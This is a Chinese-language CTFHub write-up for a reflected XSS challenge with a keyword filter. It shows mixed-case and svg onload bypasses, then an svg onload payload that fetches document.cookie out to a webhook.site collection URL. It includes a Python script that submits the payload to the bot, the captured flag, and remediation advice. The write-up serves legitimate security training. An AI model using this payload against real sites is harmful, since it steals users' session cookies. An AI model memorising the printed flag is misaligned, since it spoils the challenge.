CTFHub - Web - XSS - 关键字过滤

# CTFHub # Web # XSS # 关键字过滤 # Bot 外带

一、题目信息

  • 题目名称：XSS 关键字过滤
  • 题目方向：Web - XSS - 反射型
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：绕过关键字过滤执行 XSS，读取 Bot Cookie 中的 Flag。

二、漏洞分析

访问根路径后会重定向到 /?name=CTFHub，页面将输入直接拼接到 <h1> 标签中，且没有进行 HTML 实体编码：

<h1>Hello, CTFHub
</h1>

输入不同标签后可以确认服务端使用了大小写敏感的字符串黑名单。它只删除小写的部分关键字，并不等于阻止脚本执行：

输入页面输出结论
<script>alert(1)</script><>alert(1)</>小写 script 被删除
<ScRiPt>alert(1)</ScRiPt>原样输出大小写混写可绕过
<img src=x onerror=alert(1)>< src=x =alert(1)>img、onerror 被删除
<svg onload=...>原样输出可直接触发事件

黑名单过滤无法覆盖 HTML 标签、事件属性和大小写变体。仅过滤几个固定字符串不能作为 XSS 防护措施。

三、构造外带 Payload

创建一个临时 Webhook，使用不受过滤影响的 svg onload 事件读取 document.cookie，并发送到回连地址。使用 encodeURIComponent 可确保 Cookie 中的分号等字符不会破坏 URL：

<svg onload=fetch('https://webhook.site/<token>/?c='+encodeURIComponent(document.cookie))>

将 Payload 放入 name 参数并提交给 Bot：

import requests
from urllib.parse import quote

base = "http://challenge-<id>.sandbox.ctfhub.com:10800"
payload = "<svg onload=fetch('https://webhook.site/<token>/?c='+encodeURIComponent(document.cookie))>"
target = base + "/?name=" + quote(payload, safe="")

r = requests.post(base + "/submit", json={"url": target}, timeout=30)
print(r.text)

提交成功时接口返回：

{
  "code": 0,
  "msg": "Successfully"
}

四、读取回连结果

Bot 使用 HeadlessChrome 访问目标 URL，页面加载时执行 onload，将可读 Cookie 发送到 Webhook。回连查询参数中成功得到 Flag：

GET /?c=flag%3Dctfhub%7B720e3e2b7477b6899aebca55%7D

URL 解码后为 flag=ctfhub{720e3e2b7477b6899aebca55}。

五、最终 Flag

ctfhub{720e3e2b7477b6899aebca55}

六、修复建议

  • 根据输出上下文对不可信输入进行 HTML 实体编码，禁止直接拼接用户输入。
  • 不要依赖关键字黑名单；如需过滤，也只能作为纵深防御，不能替代输出编码。
  • 为敏感 Cookie 设置 HttpOnly、Secure 和合适的 SameSite 属性。
  • 部署 CSP，通过 script-src、connect-src 等指令限制脚本执行与数据外带。
